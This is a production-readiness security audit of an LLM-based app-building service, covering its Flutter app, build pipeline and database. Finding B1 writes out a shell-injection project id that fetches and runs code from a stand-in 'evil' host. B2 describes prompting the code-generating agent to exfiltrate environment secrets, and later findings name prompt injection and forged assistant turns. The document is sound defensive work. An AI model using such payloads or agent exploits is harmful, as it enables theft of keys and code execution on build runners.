# Full Production-Readiness Audit — App Building

_Audit date: 2026-10-28 · Scope: Flutter app (lib/ + test/), build pipeline (worker.sh,
workflows, templates), edge functions, Supabase database, Supabase advisors, ops posture.
Method: two exhaustive code audits (line-level evidence), live DB inspection (schema, RLS,
FKs, functions, cron, orphans), Supabase security + performance advisors._

---

## Executive summary

**Maturity: strong beta, not yet production-hardened.** The system shows unusual
engineering discipline for its stage — an atomic dispatch claim with a race-proof lock,
a monorepo design that structurally removed the repo-creation limiter, DB-enforced quota,
PAT pre-flight with quarantine, honest failure taxonomy, accessibility gates, and candid
documentation of every incident. But the audit found **3 blockers** concentrated in one
theme — **trust boundaries around untrusted content** — plus a cluster of reliability
races that only matter at scale, and an operability gap (alerts nobody reads, no error
tracking, no backups).

| Layer | Grade | One-liner |
|---|---|---|
| Flutter app | 5.5/10 | Clean skeleton, disciplined degrade philosophy; leaks memory & cross-account state, router churn, untested core logic |
| Pipeline (worker + workflows) | 6/10 | Genuinely well-engineered recovery design; three trust-boundary blockers and time-based recovery races |
| Edge functions | 7/10 | Auth, sanitization, rate limits, atomic claim all correct; minor timeout/leak gaps |
| Database | 8/10 | RLS everywhere, cascades complete, definer functions pinned; needs length caps, one index, advisor fixes |
| Ops | 3/10 | Watch-it-yourself posture: no alert consumer, no error tracking, no backups, single-owner SPOFs |

---

## 🔴 BLOCKERS (must fix before any public exposure)

### B1 — Workflow-input script injection → RCE on the keystore-holding runner
`projects.id` is client-generated TEXT with **no format validation** anywhere. It flows:
app → request-build → `client_payload` → worker env → `APP_DIR="apps/${PROJECT_ID}"` /
`RELEASE_TAG="af-${PROJECT_ID}"` (worker.sh) → dispatch inputs → **interpolated into
shell in build.yml**: `TAG="af-$(basename '${{ inputs.app_dir }}')"`. A crafted id
(`x'; curl http://evil/sh|bash; '`) executes arbitrary code on the build runner, which
holds `KEYSTORE_*` secrets and a `contents:write` token. Same family:
`working-directory: ${{ inputs.app_dir }}` (path traversal escapes `apps/`), and
`rm -rf "$MONO_APP"` in worker.sh with a traversal id.
**Fix:** (a) enforce `^[A-Za-z0-9_-]{1,64}$` on PROJECT_ID in worker.sh (fail fast) + a DB
CHECK constraint; (b) stop interpolating inputs into `run:` — pass them via `env:` and
reference `"$APP_DIR"`/`"$DART_NAME"` (GitHub's canonical remediation).

### B2 — Untrusted generated code executes with crown-jewel secrets in its environment
The worker runs `flutter pub get` / `flutter test` on agent-generated code **with
`SUPABASE_SERVICE_ROLE_KEY` and `OPENCODE_API_KEY` in the process env** (factory-worker.yml
L52–61) — readable via `Platform.environment`. The codegen file allowlist is advisory
only (worker copies `$WORK`/`. wholesale); agent-authored `android/` gradle files and
arbitrary pub dependencies (Gradle plugins execute at build time) reach the build runner.
A prompt like "write a test that POSTs Platform.environment to my server" plausibly
survives the template constraints because nothing scans the output.
**Fix:** scrub the env for flutter invocations (`env -u …` or a minimal-env subshell);
enforce the allowlist mechanically (delete everything outside `pubspec.yaml, lib/**,
test/**, README.md` before copying); reject pubspec sources other than `pub.dev` +
require pinned versions; consider splitting build (no secrets) from publish (dependent
job).

### B3 — One shared upload keystore signs every generated app on every account
Combined with B1/B2 this is a single point of total signing compromise: a leaked keystore
signs malicious updates installable over every app ever shipped.
**Fix:** per-account (or per-app) signing keys generated at first build; rotation story
before public launch; keep the master key offline.

---

## 🟠 HIGH findings

### Flutter app
| # | Finding | Evidence |
|---|---|---|
| H-A1 | **Router rebuilt on every auth event** — every `onAuthStateChange` (incl. TOKEN_REFRESHED) recreates GoRouter → navigation stack reset mid-flow | router.dart:14-19, providers.dart:38-40 |
| H-A2 | **Family message provider never disposes** — every opened chat's messages live in RAM forever | chats_providers.dart:322-325 |
| H-A3 | **Account switch leaks user A's data to user B** — chats/messages providers never re-key on auth change | chats_providers.dart:21-31 |
| H-A4 | **Deleted projects resurrect** — delete failure swallowed, 12s poll merges the still-existing row back | projects_providers.dart:311-326, 82-84 |
| H-A5 | **Store outage during chat open seeds greeting over real history** — bootstrap catch path replaces persisted turns with the greeting | chats_providers.dart:200-202 |
| H-A6 | **Core logic untested** — stage mapping, the merge that fixed the data-loss bug, retry dispatch, all three repositories (untestable: static SupabaseConfig.client) | test/ inventory |

### Pipeline
| # | Finding | Evidence |
|---|---|---|
| H-P1 | **Transient GitHub error permanently quarantines healthy pool accounts** (transport failure → `active:false`); no re-validation sweep → pool exhaustion = factory-wide outage | worker.sh validate_pat + claim loop |
| H-P2 | **`npm install -g opencode-ai@latest` every run** — supply-chain + non-reproducible codegen | worker.sh L197 |
| H-P3 | **Poll `--limit 40` misses our run under burst** → false 27-min timeout while the build succeeds (row vs release contradiction, double-spend on retry) | worker.sh poll |
| H-P4 | **Watchdog sweep races live workers** — smoke/repair loop legally runs 45+ min with zero DB writes; sweep auto-fails live rows → user retries → resurrect conflicts | pg_cron sweep vs worker stages |
| H-P5 | **No content gate between user intent and a signed, published APK** — malicious app requests (spyware-flavored) have no refusal layer; plan text unaudited | agent-chat SYSTEM + codegen template |
| H-P6 | **Secrets resident during untrusted build** — keystore + tokens in env while generated dependencies execute | build.yml |

### Ops
| # | Finding | Evidence |
|---|---|---|
| H-O1 | **Single points of failure**: one factory repo, one Supabase project, one funded LLM key for chat+codegen, one owner account, PATs plaintext in DB | various |
| H-O2 | **No backups** on the current Supabase tier; no PITR; no export routine | Supabase plan |
| H-O3 | **No error tracking / alert consumer** — `factory_alerts` rows written, nothing reads them; no Sentry; sweep actions raise no alerts | ops posture |

---

## 🟡 MEDIUM (condensed)

**Flutter:** streaming rebuilds all bubbles per token + `SelectableText` cost · missing
item keys in all three lists · 12s poll assigns fresh list identity (whole-app rebuilds,
runs while backgrounded) · double bootstrap fetch on chat open · session token in
plaintext SharedPreferences · `apkUrl` launched with zero scheme/host validation ·
client-forged assistant turns steer the LLM · deep-link destination lost after auth ·
hardcoded Supabase URL default bakes the project ref into builds · god-files
(chat_screen 518, detail 501) · Phase-1 simulation code embedded in the production
notifier · haptics fired from notifiers · core→data import inversion · raw Postgres
errors surfaced verbatim · funnel_events client-writable (spam vector).

**Pipeline:** Supabase read failure misread as "row vanished" (exit 0, green run) ·
claim + row-read single-shot before expensive stages · poll timeout orphans a
possibly-successful build · gh/git calls lack per-call timeouts · poll errors swallowed
(`|| true`) · shared per-PAT REST budget (80 polls/build × bursts) · repo-create race
burns the 8-min ladder ("already exists" not classified) · manual workflow re-run
bypasses the dispatch guard (no worker-side lease) · repair-loop prompt injection ·
dispatch fetch has no timeout (hung GH holds the row) · internal error details leaked to
clients (raw GH/LLM bodies) · rate-limit refusal conflated with failure; daily ceiling
alert-only (24 builds/day still allowed) · `timeout-minutes: 20` tight for APK+AAB cold
builds · actions tag-pinned not SHA-pinned · no concurrency group (latest-flag races) ·
dead `FACTORY_GH_PAT` wiring in factory-worker.yml · monorepo clone grows linearly with
every app ever built (no pruning) · `ASSET_OK` uninitialized (cryptic trap error).

**DB:** no length caps on `prompt`/`content`/`name` (1MB prompt inflates every LLM call)
· `funnel_events_user_fk` unindexed (advisor) · `touch_updated_at` mutable search_path
(advisor) · `assert_rate_ok` executable by `anon` (default PUBLIC grant — advisor) · 6
RLS policies re-evaluate `auth.uid()` per row — use `(select auth.uid())` (advisor,
perf-at-scale) · leaked-password protection disabled (advisor, dashboard toggle) · PATs
plaintext in `factory_accounts` (supabase_vault extension is installed and unused).

**Flutter low:** riverpod 2.x / go_router old majors · version strings hardcoded twice ·
dead code (`AppProject.slug`, `AuthSession.guest`, `radiusSheet`, dead validator) ·
`copyWith` drops `refused`/`buildInfo` (erases refusal state locally until next poll) ·
double chat write per send (rename + touch) · `_runs` map unbounded · duplicate
`_currentUserId`/id-gen logic.

---

## ✅ What is already right (verified, not assumed)

- Atomic dispatch claim (`dispatched_at` + conditional update) — race-proof, e2e-proven
- Quota + rate limits enforced **server-side** (DB trigger + RPC); client meter display-only
- RLS on every table, complete cascade chain (auth.users → profiles → chats/projects → messages), zero orphans
- All security-definer functions pin `search_path=""` (advisor-clean except one trigger fn)
- Monorepo + identical build.yml design (structurally removed the repo-creation limiter; 20/20 burst soak)
- Fail-fast error classification, PAT pre-flight + quarantine, honest failure taxonomy
- Accessibility gates (WCAG contrast on blended backgrounds, 135% Dynamic Type) — most apps never build these
- Zero TODO/FIXME debt; candid incident documentation (BACKEND.md post-mortems)
- Free Actions minutes (public repos), pinned Flutter 3.47.7, `pubspec.lock` committed

---

## Scalability model (the math)

| Resource | Today | Ceiling | Breach point |
|---|---|---|---|
| Actions minutes | free (public repos) | 20 concurrent jobs/account | ~20 parallel builds; 3 accounts → 60 |
| Monorepo push contention | 3 repos, rebase+retry ladder | ~7.75 min ladder | ~17 concurrent workers per account |
| Poll budget | one PAT, 80 polls/build | 5 000 REST/hr | ~60 concurrent builds per token-hour |
| LLM cost | $0.05–0.15/build | budget | ~$150/mo at 1 000 builds — fine |
| Supabase free tier | ~0.5 MB used | 500 MB DB / 5 GB egress / 500 K fn calls | chat growth + funnel events |
| Monorepo size | full clone every build | clone time grows linearly | ~hundreds of apps per repo |

**Conclusion:** beta scale (10–20 testers) is safe. The first real wall is the 20-job
concurrency + push contention at ~50-user bursts, then monorepo clone time at hundreds
of apps per account.

---

## Phase 6+ roadmap

### Phase 6 — Security hardening (BLOCKERS; before any public exposure)
1. ~~B1: PROJECT_ID charset validation (worker + DB CHECK) + env-mediated workflow inputs~~
   **DONE 2026-10-28 (324a07a)** — worker gate (14/14 synthetic incl. shell breakout,
   traversal, subst), DB `projects_id_format` CHECK (23514 proven), edge v23 early
   rejection (400 proven), build.yml inputs ONLY via job env (zero `inputs.*` in run:;
   full live build shipped signed APK+AAB through the new script — row ready, release
   verified on the LRU-chosen account)
2. ~~B2: env scrubbing around flutter invocations + mechanical allowlist prune + pubspec source/pin validation~~
   **DONE 2026-10-28 (99480d7)** — `UNTRUSTED_ENV` strips service/LLM/pool keys from
   every flutter probe invocation (19/19 synthetic incl. timeout composition); file
   allowlist enforced mechanically before the monorepo copy (android/ gradle trees,
   tool scripts, request.md, .dart_tool deleted; pubspec.lock kept for reproducible
   builds); pubspec gate rejects git/path/hosted sources + dependency_overrides before
   execution. Live proof: probe build shipped signed APK+AAB through the hardened
   worker (row ready, release verified).
3. ~~B3: per-account signing keys + rotation runbook~~
   **DONE 2026-10-28** — each outputs repo holds its OWN keystore (DN encodes the
   account: `CN=App Building <owner>`); live proof: probe build on hesab59hesba
   shipped an APK whose signer DN literally names the building account. Factory repo
   keeps the original key (now signs exactly one app). Rotation runbook: regenerate
   per-account keystore → update that account's KEYSTORE_* secrets → installed apps
   need one uninstall (signature change). Backups: keystores + passwords live in the
   scratch dir — owner must copy them into a password manager.
4. ~~Advisor findings + DB tightenings~~ **DONE 2026-10-28 (phase6_db_tightenings)** —
   length caps on prompt/content/name/title (8k/8k/100/200, rejection proven), funnel FK
   indexed, `touch_updated_at` search_path pinned, all 6 RLS policies rewritten with
   `(select auth.uid())` initplans (advisor auth_rls_initplan ×6 → 0), `assert_rate_ok`
   revoked from public/anon/authenticated → service_role only (proven via
   has_function_privilege). Advisors after: security = only the 3 intentional
   service-only tables (INFO) + leaked-password protection (dashboard toggle, owner
   step); performance = only unused-index INFO on the brand-new funnel index.
   **Owner step remaining: enable leaked-password protection in the dashboard
   (Auth → Providers → password → leaked password protection).**
5. H-P5: refusal policy layer + post-plan classifier + plan audit log
5. Rotate `FACTORY_DISPATCH_TOKEN` (pre-launch promise); revoke `anon` execute on `assert_rate_ok`; enable leaked-password protection; prompt/content length caps (DB CHECK + client)
6. Move PATs into supabase_vault; validate `apkUrl` host allow-list client-side

### Phase 7 — Reliability & operations
1. Worker heartbeat (stage patch every ~5 min) + sweep contract (ignore active run ids)
2. Quarantine only on definitive verdicts + re-validation sweep for inactive rows
3. Poll by `head_sha` via REST; per-call timeouts; classify poll errors
4. Alert consumer: pg_cron → edge fn → email/Telegram webhook on `factory_alerts` + sweep actions + quarantine events
5. Sentry (Flutter + edge functions) + uptime monitor on the rolling release URL
6. Backups: Supabase Pro (PITR) or nightly `pg_dump` to private storage
7. Flutter fixes: delete-tombstones, outbox for failed message writes, greeting-over-history fix, router `refreshListenable`, `ref.mounted` guards, `copyWith` fix

### Phase 8 — Scale-out architecture
1. Monorepo sharding (repo per N apps or per month) + clone pruning
2. Concurrency plan: account pool growth math, jittered backoff, dedicated read token
3. Family providers → autoDispose with `ref.mounted` guards; user-keyed state invalidation on sign-out
4. Derived lookup providers (`projectByIdProvider`) + list item keys + lifecycle-aware poll
5. List pagination (chats/projects) before 1 000-row screens

### Phase 9 — Engineering velocity
1. Inject `SupabaseClient` through repository constructors → repo/provider tests (the untested HIGH list)
2. CI job that shell-checks + smoke-tests worker.sh (bash -n + synthetic classification already exists — wire into CI)
3. Riverpod 3 + go_router typed-routes migration (after dispose-guards land)
4. God-file splits; move simulation behind a pipeline interface; hoist duplicated utils
5. `package_info_plus` for versions; errorBuilder + deep-link return path

### Phase 10 — Launch
Play listing (signed .aab ready) + data-safety form, support channel, status page, beta feedback synthesis (BETA.md), plan pricing validation from funnel data.
